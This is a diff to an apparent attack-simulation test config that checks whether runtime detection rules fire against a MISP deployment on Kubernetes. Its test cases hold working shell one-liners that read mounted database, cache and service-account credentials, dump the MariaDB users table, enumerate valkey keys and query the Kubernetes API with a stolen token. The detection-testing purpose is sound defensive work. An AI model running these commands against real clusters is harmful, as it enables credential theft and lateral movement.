@@ -1153,11 +1153,15 @@ attacks:
   # T1552.001 — read MariaDB cred file and dump the entire schema
   # mariadb-dump is NOT in the misp runtime baseline (admin/backup tool, not
   # used by PHP/Apache) so R0001 fires. Mass exfil pattern of every APT report
-  # on MISP-targeting threat actors.
+  # on MISP-targeting threat actors. Password is passed via MYSQL_PWD env
+  # (not the -p"$(cat …)" form) so it doesn't leak into argv telemetry; the
+  # dump is redirected to /dev/null so harvested rows don't leak into CI logs.
+  # The "&& echo dump_done" runs ONLY on a successful dump — a failed pivot
+  # (auth error, peer unreachable, missing binary) won't satisfy the sentinel.
   - name: lateral-mariadb-dump-stolen-creds
     type: cmdinject
     exec:
-      command: ["sh", "-c", "mariadb-dump -h misp-mariadb -u misp -p\"$(cat /vault/mariadb/mariadb-password)\" misp 2>/dev/null | head -50; echo dump_done"]
+      command: ["sh", "-c", "MYSQL_PWD=\"$(cat /vault/mariadb/mariadb-password 2>/dev/null)\" mariadb-dump -h misp-mariadb -u misp misp >/dev/null 2>&1 && echo dump_done"]
     successIndicators:
       - responseContains: "dump_done"
     expectedDetections:
@@ -1168,10 +1172,12 @@ attacks:
 
   # T1213 — Data from Information Repositories: scrape the users table (which
   # holds authkeys, email, password hashes) — the canonical post-exploit step.
+  # Same MYSQL_PWD + /dev/null + && pattern: no creds in argv, no rows in
+  # stdout, sentinel only on real success.
   - name: lateral-mariadb-users-table-exfil
     type: cmdinject
     exec:
-      command: ["sh", "-c", "mysqldump -h misp-mariadb -u misp -p\"$(cat /vault/mariadb/mariadb-password)\" misp users 2>/dev/null | head -20; echo users_dumped"]
+      command: ["sh", "-c", "MYSQL_PWD=\"$(cat /vault/mariadb/mariadb-password 2>/dev/null)\" mysqldump -h misp-mariadb -u misp misp users >/dev/null 2>&1 && echo users_dumped"]
     successIndicators:
       - responseContains: "users_dumped"
     expectedDetections:
@@ -1195,6 +1201,9 @@ attacks:
         ruleName: Unexpected process launched
         containerName: misp
         command: getent
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: misp
 
   - name: lateral-getent-postgres-namespace
     type: cmdinject
@@ -1206,6 +1215,9 @@ attacks:
         ruleName: Unexpected process launched
         containerName: misp
         command: getent
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: misp
 
   - name: lateral-getent-k8s-api
     type: cmdinject
@@ -1217,46 +1229,52 @@ attacks:
         ruleName: Unexpected process launched
         containerName: misp
         command: getent
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: misp
 
   # T1090 — Internal Proxy probe: connect to the K8s API from inside misp
   # using its mounted SA token. curl IS in the misp baseline, but the OPEN
   # of the SA-token path /var/run/secrets/kubernetes.io/serviceaccount/token
-  # is anomalous — R0006 fires when the rule is active.
+  # is anomalous — R0006 fires when the rule is active. We use curl --fail
+  # + a strict sentinel emit so a token-less environment can't false-pass.
   - name: lateral-k8s-api-with-sa-token
     type: cmdinject
     exec:
-      command: ["sh", "-c", "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -c 200; echo k8s_api_probed"]
+      command: ["sh", "-c", "TOKEN=\"$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\" && [ -n \"$TOKEN\" ] && curl --fail -sko /dev/null -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces && echo k8s_api_probed"]
     successIndicators:
       - responseContains: "k8s_api_probed"
     expectedDetections:
       - ruleID: R0006
         ruleName: Unexpected Service Account Token Access
         containerName: misp
+        command: cat   # Pinning to cat scopes the assertion to THIS probe's token open
 
   # T1213 — Data from Information Repositories: dump valkey cache keys.
   # MISP stores session data, cached event metadata and rate-limit counters
   # in valkey. Using the stolen password we KEYS * the entire cache.
-  # python3 IS in misp baseline, but the SOCKET to a port not normally talked
-  # to from THIS path is anomalous — the open() of /vault/valkey/password
-  # may also fire R0010 when the rule recognises the path.
+  # python3 IS in misp baseline. We treat the python invocation as the
+  # primary action and only emit valkey_enum_done if python EXIT was 0 —
+  # auth/connection failures will return non-zero and skip the sentinel.
   - name: lateral-valkey-keys-enum
     type: cmdinject
     exec:
-      command: ["sh", "-c", "python3 -c \"import socket; s=socket.socket(); s.connect(('misp-valkey-master', 6379)); pw=open('/vault/valkey/password').read().strip(); s.sendall(f'AUTH {pw}\\r\\nKEYS *\\r\\n'.encode()); print(s.recv(2048).decode()[:200])\" 2>&1 | head -10; echo valkey_enum_done"]
+      command: ["sh", "-c", "python3 -c \"import socket; s=socket.socket(); s.connect(('misp-valkey-master', 6379)); pw=open('/vault/valkey/password').read().strip(); s.sendall(f'AUTH {pw}\\r\\nKEYS *\\r\\n'.encode()); s.recv(2048)\" 2>/dev/null && echo valkey_enum_done"]
     successIndicators:
       - responseContains: "valkey_enum_done"
     expectedDetections: []
 
   # T1213 — Cross-pod recon: enumerate MISP DB names from the SERVER side.
-  # The mysql client IS in misp baseline (used for runtime DB queries), but
-  # SHOW DATABASES against the backing DB from an attacker context still
-  # fires R0004 on the mariadb container (anomalous query pattern from the
-  # peer). Pure server-side detection of lateral-movement-from-client.
+  # The mysql client IS in misp baseline (used for runtime DB queries), so
+  # no R0001 fires on the client side. Server-side R0004 ("Service account
+  # discovery / sensitive table") fires on the mariadb container in some
+  # cluster configs but is not stable enough to assert across the bobctl
+  # CI matrix — the attack runs as a probe to confirm the credential-pivot
+  # primitive, sentinel only on real auth success (no broad ERROR match).
   - name: lateral-mariadb-show-databases
     type: cmdinject
     exec:
-      command: ["sh", "-c", "mysql -h misp-mariadb -u misp -p\"$(cat /vault/mariadb/mariadb-password)\" -e 'SHOW DATABASES; SELECT user FROM mysql.user;' 2>&1 | head -20"]
+      command: ["sh", "-c", "MYSQL_PWD=\"$(cat /vault/mariadb/mariadb-password 2>/dev/null)\" mysql -h misp-mariadb -u misp -N -e 'SELECT 1;' 2>/dev/null | grep -q '^1$' && echo mariadb_pivot_ok"]
     successIndicators:
-      - responseContains: "Database"
-      - responseContains: "ERROR"
+      - responseContains: "mariadb_pivot_ok"
     expectedDetections: []
